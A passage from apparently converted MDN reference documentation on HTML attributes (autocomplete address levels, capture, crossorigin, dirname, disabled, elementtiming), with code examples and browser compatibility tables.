country. Below are some examples; this is not meant to be an exhaustive list.\n\n#### United States\n\nA typical home address within the United States looks like this:\n\n432 Anywhere St Exampleville CA 95555\n\nIn the United States, the least-specific portion of the address is the state, in this case \"CA\" (the official US Postal Service shorthand for \"California\"). Thus `address-level1` is the state, or \"CA\" in this case.\n\nThe second-least specific portion of the address is the city or town name, so `address-level2` is \"Exampleville\" in this example address.\n\nUnited States addresses do not use levels 3 and up.\n\n#### United Kingdom\n\nAddress input forms in the UK should contain one address level and one, two or three address lines, depending on the address. A complete address would look like so:\n\n103 Frogmarch Street Upper-Wapping Winchelsea TN99 8ZZ\n\nThe address levels are:\n\n- `address-level1`: The post town — \"Winchelsea\" in this case.\n- `address-line2`: The locality — \"Upper-Wapping\" in this case.\n- `address-line1`: The house/street particulars — \"103 Frogmarch Street\".\n\nThe postcode is separate. Note that you can actually use just the postcode and `address-line1` to successfully deliver mail in the UK, so they should be the only mandatory items, but usually people tend to provide more details.\n\n#### China\n\nChina can use as many as three administrative levels: the province, the city, and the district.\n\nThe 6 digit postal code is not always needed but when supplied it is placed separately with a label for clarity. For example:\n\n北京市东城区建国门北大街 8 号华润大厦 17 层 1708 单元 邮编：100005\n\n#### Japan\n\nAn address in Japan is typically **written in one line**, in an order from the least-specific to more-specific portions (in **reverse order to the United States**). There are two or three administrative levels in an address. Additional line can be used to show building names and room numbers. The postal code is separate. For example:\n\n〒 381-0000 長野県長野市某町 123\n\n\"〒\" and following seven digits shows the postal code.\n\n`address-level1` is used for prefectures or the Tokyo Metropolis; \"長野県\" (Nagano Prefecture) is in this case. `address-level2` is typically used for cities, counties, towns and villages; \"長野市\" (Nagano City) in this case. \"某町 123\" is `address-line1` which consists of an area name and a lot number.\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|                 | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|-----------------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|                 | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `autocomplete`  | 66      | 79   | 59      | 53    | 9.1    | 66             | 59                  | 47            | 9.3           | 9.0              | 66              |     |\n| `new-password`  | No      | No   | 67      | No    | No     | No             | 67                  | No            | No            | No               | No              |     |\n| `one-time-code` | 93      | 93   | 109     | 79    | 12     | 84             | 109                 | 60            | 12            | 14.0             | No              |     |\n| `webauthn`      | 108     | 108  | No      | 94    | No     | 108            | No                  | 73            | No            | 21.0             | 108             |     |\n\n|                | Desktop |      |         |            |        |                | Mobile              |               |               |                  |                 |     |\n|----------------|---------|------|---------|------------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|                | Chrome  | Edge | Firefox | Opera      | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `autocomplete` | 66      | 79   | 59      | 53≤12.1–15 | 9.1    | 66             | 59                  | 47≤12.1–14    | 9.3           | 9.0              | 66              |     |\n\n|                | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|----------------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|                | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `autocomplete` | 14      | 12   | 4       | ≤12.1 | 6      | 18             | 4                   | ≤12.1         | 6             | 1.0              | 4.4             |     |\n\n[TABLE]\n\n### html.elements.form.autocomplete\n\nBCD tables only load in the browser with JavaScript enabled. Enable JavaScript to view data.\n\n### html.elements.input.autocomplete\n\nBCD tables only load in the browser with JavaScript enabled. Enable JavaScript to view data.\n\n### html.elements.select.autocomplete\n\nBCD tables only load in the browser with JavaScript enabled. Enable JavaScript to view data.\n\n### html.elements.textarea.autocomplete\n\nBCD tables only load in the browser with JavaScript enabled. Enable JavaScript to view data.\n\n## See also\n\n- The [`<input>`](../element/input) element\n- The [`<select>`](../element/select) element\n- The [`<textarea>`](../element/textarea) element\n- The [`<form>`](../element/form) element\n- [HTML forms](https://developer.mozilla.org/en-US/docs/Learn/Forms)\n- All [global attributes](../global_attributes)\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/autocomplete](https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/autocomplete)"
- name: Attributes.capture
  summary: This feature is not Baseline because it does not work in some of the most widely-used browsers
  description: "# HTML attribute: capture\n\n## Limited availability\n\nThis feature is not Baseline because it does not work in some of the most widely-used browsers.\n\n- [Learn more](https://developer.mozilla.org/en-US/docs/Glossary/Baseline/Compatibility)\n- [See full compatibility](#browser_compatibility)\n- [Report feedback](https://survey.alchemer.com/s3/7634825/MDN-baseline-feedback?page=%2Fen-US%2Fdocs%2FWeb%2FHTML%2FAttributes%2Fcapture&level=not)\n\nThe `capture` attribute specifies that, optionally, a new file should be captured, and which device should be used to capture that new media of a type defined by the [`accept`](accept) attribute.\n\nValues include `user` and `environment`. The capture attribute is supported on the [file](../element/input/file) input type.\n\nThe `capture` attribute takes as its value a string that specifies which camera to use for capture of image or video data, if the [accept](accept) attribute indicates that the input should be of one of those types.\n\n| Value         | Description                                                |\n|---------------|------------------------------------------------------------|\n| `user`        | The user-facing camera and/or microphone should be used.   |\n| `environment` | The outward-facing camera and/or microphone should be used |\n\n**Note:** Capture was previously a Boolean attribute which, if present, requested that the device's media capture device(s) such as camera or microphone be used instead of requesting a file input.\n\n## Try it\n\n#### HTML Demo: capture\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <label for=\"selfie\">Take a picture of your face:</label>\n\n    <input type=\"file\" id=\"selfie\" name=\"selfie\" accept=\"image/*\" capture=\"user\" />\n\n    <label for=\"picture\">Take a picture using back facing camera:</label>\n\n    <input type=\"file\" id=\"picture\" name=\"picture\" accept=\"image/*\" capture=\"environment\" />\n\n    label {\n      display: block;\n      margin-top: 1rem;\n    }\n\n    input {\n      margin-bottom: 1rem;\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\n## Examples\n\nWhen set on a file input type, operating systems with microphones and cameras will display a user interface allowing the selection from an existing file or the creating of a new one.\n\nhtml\n\n```\n<p>\n  <label for=\"soundFile\">What does your voice sound like?:</label>\n  <input type=\"file\" id=\"soundFile\" capture=\"user\" accept=\"audio/*\" />\n</p>\n<p>\n  <label for=\"videoFile\">Upload a video:</label>\n  <input type=\"file\" id=\"videoFile\" capture=\"environment\" accept=\"video/*\" />\n</p>\n<p>\n  <label for=\"imageFile\">Upload a photo of yourself:</label>\n  <input type=\"file\" id=\"imageFile\" capture=\"user\" accept=\"image/*\" />\n</p>\n```\n\nNote these work better on mobile devices; if your device is a desktop computer, you'll likely get a typical file picker.\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|           | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|-----------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|           | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `capture` | No      | No   | No      | No    | No     | 25             | 79                  | 14            | 10            | 1.5              | 4.4             |     |\n\n## See also\n\n- [Using files from web applications](https://developer.mozilla.org/en-US/docs/Web/API/File_API/Using_files_from_web_applications)\n- [File API](https://developer.mozilla.org/en-US/docs/Web/API/File)\n- [`HTMLInputElement.files`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement/files)\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/capture](https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/capture)"
- name: Attributes.crossorigin
  summary: The crossorigin attribute, valid on the <audio>, <img>, <link>, <script>, and <video> elements, provides support for CORS, defining how the element handles cross-origin requests, thereby enabling the configuration of the CORS requests for the element's fetched data
  description: "# HTML attribute: crossorigin\n\nThe `crossorigin` attribute, valid on the [`<audio>`](../element/audio), [`<img>`](../element/img), [`<link>`](../element/link), [`<script>`](../element/script), and [`<video>`](../element/video) elements, provides support for [CORS](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS), defining how the element handles cross-origin requests, thereby enabling the configuration of the CORS requests for the element's fetched data. Depending on the element, the attribute can be a CORS settings attribute.\n\nThe `crossorigin` content attribute on media elements is a CORS settings attribute.\n\nThese attributes are [enumerated](https://developer.mozilla.org/en-US/docs/Glossary/Enumerated), and have the following possible values:\n\n[`anonymous`](#anonymous)  \nRequest uses CORS headers and credentials flag is set to `'same-origin'`. There is no exchange of **user credentials** via cookies, client-side TLS certificates or HTTP authentication, unless destination is the same origin.\n\n[`use-credentials`](#use-credentials)  \nRequest uses CORS headers, credentials flag is set to `'include'` and **user credentials** are always included.\n\n[`\"\"`](#sect1)  \nSetting the attribute name to an empty value, like `crossorigin` or `crossorigin=\"\"`, is the same as `anonymous`.\n\nAn invalid keyword and an empty string will be handled as the `anonymous` keyword.\n\nBy default (that is, when the attribute is not specified), CORS is not used at all. The user agent will not ask for permission for full access to the resource and in the case of a cross-origin request, certain limitations will be applied based on the type of element concerned:\n\n|                         |                                                                                                                                                    |\n|-------------------------|----------------------------------------------------------------------------------------------------------------------------------------------------|\n| Element                 | Restrictions                                                                                                                                       |\n| `img`, `audio`, `video` | When resource is placed in [`<canvas>`](../element/canvas), element is marked as [*tainted*](../cors_enabled_image#security_and_tainted_canvases). |\n| `script`                | Access to error logging via [`window.onerror`](https://developer.mozilla.org/en-US/docs/Web/API/Window/error_event) will be limited.               |\n| `link`                  | Request with no appropriate `crossorigin` header may be discarded.                                                                                 |\n\n**Note:** The `crossorigin` attribute is not supported for [`rel=\"icon\"`](rel#icon) in Chromium-based browsers. See the [open Chromium issue](https://crbug.com/1121645).\n\n### Example: `crossorigin` with the `<script>` element\n\nYou can use the following [`<script>`](../element/script) element to tell a browser to execute the `https://example.com/example-framework.js` script without sending user-credentials.\n\nhtml\n\n```\n<script\n  src=\"https://example.com/example-framework.js\"\n  crossorigin=\"anonymous\"></script>\n```\n\n### Example: Web manifest with credentials\n\nThe `use-credentials` value must be used when fetching a [manifest](https://developer.mozilla.org/en-US/docs/Web/Manifest) that requires credentials, even if the file is from the same origin.\n\nhtml\n\n```\n<link rel=\"manifest\" href=\"/app.webmanifest\" crossorigin=\"use-credentials\" />\n```\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n[TABLE]\n\n[TABLE]\n\n[TABLE]\n\n|               | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|---------------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|               | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `crossorigin` | 13      | 12   | 8       | 15    | 6      | 18             | 8                   | 14            | 6             | 1.0              | 4.4             |     |\n\n[TABLE]\n\n### html.elements.audio.crossorigin\n\nBCD tables only load in the browser with JavaScript enabled. Enable JavaScript to view data.\n\n### html.elements.img.crossorigin\n\nBCD tables only load in the browser with JavaScript enabled. Enable JavaScript to view data.\n\n### html.elements.link.crossorigin\n\nBCD tables only load in the browser with JavaScript enabled. Enable JavaScript to view data.\n\n### html.elements.script.crossorigin\n\nBCD tables only load in the browser with JavaScript enabled. Enable JavaScript to view data.\n\n### html.elements.video.crossorigin\n\nBCD tables only load in the browser with JavaScript enabled. Enable JavaScript to view data.\n\n## See also\n\n- [Cross-Origin Resource Sharing (CORS)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS)\n- [HTML attribute: `rel`](rel)\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/crossorigin](https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/crossorigin)"
- name: Attributes.dirname
  summary: The dirname attribute can be used on the <textarea> element and several <input> types and describes the directionality of the element's text content during form submission
  description: "# HTML attribute: dirname\n\nThe `dirname` attribute can be used on the [`<textarea>`](../element/textarea) element and several [`<input>`](../element/input) types and describes the directionality of the element's text content during form submission. The browser uses this attribute's value to determine whether text the user has entered is left-to-right or right-to-left oriented. When used, the element's text directionality value is included in form submission data along with the `dirname` attribute's value as the name of the field.\n\n## Usage notes\n\nThe `dirname` attribute can be used on any [`<textarea>`](../element/textarea) element, or any [`<input>`](../element/input) element with [hidden](../element/input/hidden), [text](../element/input/text), [search](../element/input/search), [tel](../element/input/tel), [url](../element/input/url), [email](../element/input/email), [password](../element/input/password), [submit](../element/input/submit), [reset](../element/input/reset) or [button](../element/input/button) type.\n\nThe format of the submitted data is `{dirname_value}={direction}` where `{dirname_value}` is the value of the `dirname` attribute and `{direction}` is the directionality of the text. For example, if the user enters \"Hello\" in an element with the attributes `name=\"comment\"` and `dirname=\"comment-direction\"`, the URL-encoded form submission data for `GET` requests will be `comment=Hello&comment-direction=ltr`. The directionality is one of the following:\n\n[`rtl`](#rtl)  \nThe text entered by the user is in a right-to-left writing direction.\n\n[`ltr`](#ltr)  \nThe text entered by the user is in a left-to-right writing direction.\n\nIf no text directionality is specified, the user agent will use the directionality of the parent element containing the form, and if that is not specified, the default directionality of the user agent.\n\n## Examples\n\n### Textarea element directionality\n\nIn this example, the `dir=\"auto\"` attribute on the textarea element allows the text directionality to be determined automatically based on the text entered by the user:\n\nhtml\n\n```\n<form method=\"get\" action=\"https://www.example.com/submit\">\n  <textarea name=\"comment\" dir=\"auto\" dirname=\"comment-direction\">سيب</textarea>\n  <button type=\"submit\">Send my greetings</button>\n</form>\n```\n\nWhen the user submits the form, the user agent includes two fields, one called `comment` with the value \"سيب\", and one called `comment-direction` with the value \"rtl\". The URL-encoded submission body looks like this:\n\nurl\n\n```\nhttps://www.example.com/submit?comment=%D8%B3%D9%8A%D8%A8&comment-direction=rtl\n```\n\n### Input element directionality\n\nIn this example, the `dir=\"auto\"` attribute on the input element allows the text directionality to be determined automatically based on the text entered by the user:\n\nhtml\n\n```\n<form method=\"get\" action=\"https://www.example.com/submit\">\n  <input\n    type=\"text\"\n    name=\"comment-input\"\n    dir=\"auto\"\n    dirname=\"comment-direction\"\n    value=\"Hello\" />\n  <button type=\"submit\">Send my greetings</button>\n</form>\n```\n\nWhen the user submits the form, the user agent includes two fields, one called `comment-input` with the value \"Hello\", and one called `comment-direction` with the value \"ltr\":\n\nurl\n\n```\nhttps://www.example.com/submit?comment-input=Hello&comment-direction=ltr\n```\n\n### Inheriting directionality\n\nThe following `<input>` and `<textarea>` elements do not have a `dir` attribute, so they inherit the explicit directionality of their parent element, which is `rtl`:\n\nhtml\n\n```\n<div dir=\"rtl\">\n  <form method=\"get\" action=\"https://www.example.com/submit\">\n    <input\n      type=\"text\"\n      name=\"user\"\n      dirname=\"user-direction\"\n      value=\"LTR Username\" />\n    <textarea name=\"comment\" dirname=\"comment-direction\">LTR Comment</textarea>\n    <button type=\"submit\">Post Comment</button>\n  </form>\n</div>\n```\n\nThe URL-encoded submission body looks like this:\n\nurl\n\n```\nhttps://www.example.com/submit?user=LTR+Username&user-direction=rtl&comment=LTR+Comment&comment-direction=rtl\n```\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|           | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|-----------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|           | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `dirname` | 17      | 79   | 116     | ≤12.1 | 6      | 18             | 116                 | ≤12.1         | 6             | 1.0              | 4.4             |     |\n\n|           | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|-----------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|           | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `dirname` | 17      | 79   | 116     | ≤12.1 | 6      | 18             | 116                 | ≤12.1         | 6             | 1.0              | ≤37             |     |\n\n### html.elements.textarea.dirname\n\nBCD tables only load in the browser with JavaScript enabled. Enable JavaScript to view data.\n\n### html.elements.input.dirname\n\nBCD tables only load in the browser with JavaScript enabled. Enable JavaScript to view data.\n\n## See also\n\n- [`dir` attribute](../global_attributes/dir)\n- [`<input>`](../element/input)\n- [`<textarea>`](../element/textarea)\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/dirname](https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/dirname)"
- name: Attributes.disabled
  summary: The Boolean disabled attribute, when present, makes the element not mutable, focusable, or even submitted with the form
  description: "# HTML attribute: disabled\n\nThe Boolean `disabled` attribute, when present, makes the element not mutable, focusable, or even submitted with the form. The user can neither edit nor focus on the control, nor its form control descendants.\n\n## Try it\n\n#### HTML Demo: disabled\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <form>\n      <label for=\"name\">Name:</label>\n      <input id=\"name\" name=\"name\" type=\"text\" />\n\n      <label for=\"emp\">Employed:</label>\n      <select id=\"emp\" name=\"emp\" disabled>\n        <option>No</option>\n        <option>Yes</option>\n      </select>\n\n      <label for=\"empDate\">Employment Date:</label>\n      <input id=\"empDate\" name=\"empDate\" type=\"date\" disabled />\n\n      <label for=\"resume\">Resume:</label>\n      <input id=\"resume\" name=\"resume\" type=\"file\" />\n    </form>\n\n    label {\n      display: block;\n      margin-top: 1em;\n    }\n\n    *:disabled {\n      background-color: dimgrey;\n      color: linen;\n      opacity: 1;\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\n## Overview\n\nIf the `disabled` attribute is specified on a form control, the element and its form control descendants do not participate in constraint validation. Often browsers grey out such controls and it won't receive any browsing events, like mouse clicks or focus-related ones.\n\nThe `disabled` attribute is supported by [`<button>`](../element/button), [`<fieldset>`](../element/fieldset), [`<optgroup>`](../element/optgroup), [`<option>`](../element/option), [`<select>`](../element/select), [`<textarea>`](../element/textarea) and [`<input>`](../element/input).\n\nThis Boolean disabled attribute indicates that the user cannot interact with the control or its descendant controls. If this attribute is not specified, the control inherits its setting from the containing element, for example `fieldset`; if there is no containing element with the `disabled` attribute set, and the control itself does not have the attribute, then the control is enabled. If declared on an [`<optgroup>`](../element/optgroup), the select is still interactive (unless otherwise disabled), but none of the items in the option group are selectable.\n\n**Note:** If a [`<fieldset>`](../element/fieldset) is disabled, the descendant form controls are all disabled, with the exception of form controls within the [`<legend>`](../element/legend).\n\nWhen a supporting element has the `disabled` attribute applied, the [`:disabled`](https://developer.mozilla.org/en-US/docs/Web/CSS/:disabled) pseudo-class also applies to it. Conversely, elements that support the `disabled` attribute but don't have the attribute set match the [`:enabled`](https://developer.mozilla.org/en-US/docs/Web/CSS/:enabled) pseudo-class.\n\nThis Boolean attribute prevents the user from interacting with the button. If this attribute isn't set, the button can still be disabled from a containing element, for example [`<fieldset>`](../element/fieldset); if there is no containing element with the `disabled` attribute set, then the button is enabled.\n\nFirefox will, unlike other browsers, persist the dynamic disabled state of a [`<button>`](../element/button) across page loads. Use the [`autocomplete`](autocomplete) attribute to control this feature.\n\n### Attribute interactions\n\nThe difference between `disabled` and [`readonly`](readonly) is that read-only controls can still function and are still focusable, whereas disabled controls can not receive focus and are not submitted with the form and generally do not function as controls until they are enabled.\n\nBecause a disabled field cannot have its value changed, [`required`](required) does not have any effect on inputs with the `disabled` attribute also specified. Additionally, since the elements become immutable, most other attributes, such as [`pattern`](pattern), have no effect, until the control is enabled.\n\n**Note:** The `required` attribute is not permitted on inputs with the `disabled` attribute specified.\n\n### Usability\n\nBrowsers display disabled form controls greyed as disabled form controls are immutable, won't receive focus or any browsing events, like mouse clicks or focus-related ones, and aren't submitted with the form.\n\nIf present on a supporting elements, the [`:disabled`](https://developer.mozilla.org/en-US/docs/Web/CSS/:disabled) pseudo class will match. If the attribute is not included, the [`:enabled`](https://developer.mozilla.org/en-US/docs/Web/CSS/:enabled) pseudo class will match. If the element doesn't support the disabled attribute, the attribute will have no effect, including not leading to being matched by the `:disabled` and `:enabled` pseudo classes.\n\n### Constraint validation\n\nIf the element is `disabled`, then the element's value can not receive focus and cannot be updated by the user, and does not participate in constraint validation.\n\n## Examples\n\nWhen form controls are disabled, many browsers will display them in a lighter, greyed-out color by default. Here are examples of a disabled checkbox, radio button, [`<option>`](../element/option) and [`<optgroup>`](../element/optgroup), as well as some form controls that are disabled via the disabled attribute set on the ancestor [`<fieldset>`](../element/fieldset) element. The [`<option>`](../element/option)s are disabled, but the [`<select>`](../element/select) itself is not. We could have disable the entire [`<select>`](../element/select) by adding the attribute to that element rather than its descendants.\n\nhtml\n\n```\n<fieldset>\n  <legend>Checkboxes</legend>\n  <p>\n    <label>\n      <input type=\"checkbox\" name=\"chbox\" value=\"regular\" /> Regular\n    </label>\n  </p>\n  <p>\n    <label>\n      <input type=\"checkbox\" name=\"chbox\" value=\"disabled\" disabled /> disabled\n    </label>\n  </p>\n</fieldset>\n\n<fieldset>\n  <legend>Radio buttons</legend>\n  <p>\n    <label> <input type=\"radio\" name=\"radio\" value=\"regular\" /> Regular </label>\n  </p>\n  <p>\n    <label>\n      <input type=\"radio\" name=\"radio\" value=\"disabled\" disabled /> disabled\n    </label>\n  </p>\n</fieldset>\n\n<p>\n  <label\n    >Select an option:\n    <select>\n      <optgroup label=\"Group 1\">\n        <option>Option 1.1</option>\n      </optgroup>\n      <optgroup label=\"Group 2\">\n        <option>Option 2.1</option>\n        <option disabled>Option 2.2</option>\n        <option>Option 2.3</option>\n      </optgroup>\n      <optgroup label=\"Group 3\" disabled>\n        <option>Disabled 3.1</option>\n        <option>Disabled 3.2</option>\n        <option>Disabled 3.3</option>\n      </optgroup>\n    </select>\n  </label>\n</p>\n\n<fieldset disabled>\n  <legend>Disabled fieldset</legend>\n  <p>\n    <label>\n      Name: <input type=\"radio\" name=\"radio\" value=\"regular\" /> Regular\n    </label>\n  </p>\n  <p>\n    <label>Number: <input type=\"number\" /></label>\n  </p>\n</fieldset>\n```\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|            | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|------------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|            | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `disabled` | 1       | 12   | 1       | ≤12.1 | ≤4     | 18             | 4                   | ≤12.1         | ≤3.2          | 1.0              | 4.4             |     |\n\n|            | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|------------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|            | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `disabled` | 1       | 12   | 1       | 15    | 3      | 18             | 4                   | 14            | 2             | 1.0              | 4.4             |     |\n\n|            | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|------------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|            | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `disabled` | 1       | 12   | 1       | 15    | ≤4     | 18             | 4                   | 14            | ≤3.2          | 1.0              | 4.4             |     |\n\n|            | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|------------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|            | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `disabled` | 1       | 12   | 1       | 15    | ≤4     | 18             | 4                   | 14            | ≤3.2          | 1.0              | 4.4             |     |\n\n|            | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|------------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|            | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `disabled` | 1       | 12   | 1       | ≤12.1 | 1      | 18             | 4                   | ≤12.1         | 1             | 1.0              | 4.4             |     |\n\n[TABLE]\n\n|            | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|------------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|            | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `disabled` | 1       | 12   | 1       | 15    | ≤4     | 18             | 4                   | 14            | ≤3.2          | 1.0              | 4.4             |     |\n\n### html.elements.button.disabled\n\nBCD tables only load in the browser with JavaScript enabled. Enable JavaScript to view data.\n\n### html.elements.fieldset.disabled\n\nBCD tables only load in the browser with JavaScript enabled. Enable JavaScript to view data.\n\n### html.elements.input.disabled\n\nBCD tables only load in the browser with JavaScript enabled. Enable JavaScript to view data.\n\n### html.elements.optgroup.disabled\n\nBCD tables only load in the browser with JavaScript enabled. Enable JavaScript to view data.\n\n### html.elements.option.disabled\n\nBCD tables only load in the browser with JavaScript enabled. Enable JavaScript to view data.\n\n### html.elements.select.disabled\n\nBCD tables only load in the browser with JavaScript enabled. Enable JavaScript to view data.\n\n### html.elements.textarea.disabled\n\nBCD tables only load in the browser with JavaScript enabled. Enable JavaScript to view data.\n\n## See also\n\n- [`:disabled`](https://developer.mozilla.org/en-US/docs/Web/CSS/:disabled) and [`:enabled`](https://developer.mozilla.org/en-US/docs/Web/CSS/:enabled)\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/disabled](https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/disabled)"
- name: Attributes.elementtiming
  summary: The elementtiming attribute is used to indicate that an element is flagged for tracking by PerformanceObserver objects using the "element" type
  description: "# HTML attribute: elementtiming\n\nThe `elementtiming` attribute is used to indicate that an element is flagged for tracking by [`PerformanceObserver`](https://developer.mozilla.org/en-US/docs/Web/API/PerformanceObserver) objects using the `\"element\"` type. For more details, see the [`PerformanceElementTiming`](https://developer.mozilla.org/en-US/docs/Web/API/PerformanceElementTiming) interface.\n\nThis attribute may be applied to [`<img>`](../element/img), [`<image>`](https://developer.mozilla.org/en-US/docs/Web/SVG/Element/image) elements inside an [`<svg>`](https://developer.mozilla.org/en-US/docs/Web/SVG/Element/svg), poster images of [`<video>`](../element/video) elements, elements which have a [`background-image`](https://developer.mozilla.org/en-US/docs/Web/CSS/background-image), and elements containing text nodes, such as a [`<p>`](../element/p).\n\nIn the DOM, this attribute is reflected as [`Element.elementTiming`](https://developer.mozilla.org/en-US/docs/Web/API/Element/elementTiming).\n\n## Usage\n\nThe value given for `elementtiming` becomes an identifier for the observed element.\n\nhtml\n\n```\n<img alt=\"alt\" src=\"img.jpg\" elementtiming=\"label for element\" />\n```\n\nGood contenders for elements you might want to observe are:\n\n- The main image for an article.\n- A blog post title\n- Images in a carousel for a shopping site.\n- The poster image for the main video on a page.\n\n## Examples\n\nhtml\n\n```\n<img\n  alt=\"Alt for a main blog post image\"\n  src=\"my-massive-image.jpg\"\n  elementtiming=\"Main image\" />\n\n<p elementtiming=\"important-text\">Some very important information.</p>\n```\n\n## See also\n\n- [`PerformanceElementTiming`](https://developer.mozilla.org/en-US/docs/Web/API/PerformanceElementTiming)\n- [`Element.elementTiming`](https://developer.mozilla.org/en-US/docs/Web/API/Element/elementTiming)\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/elementtiming](https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/elementtiming)"
- name: Attributes.for
  summary: The for attribute is an allowed attribute for <label> and <output>
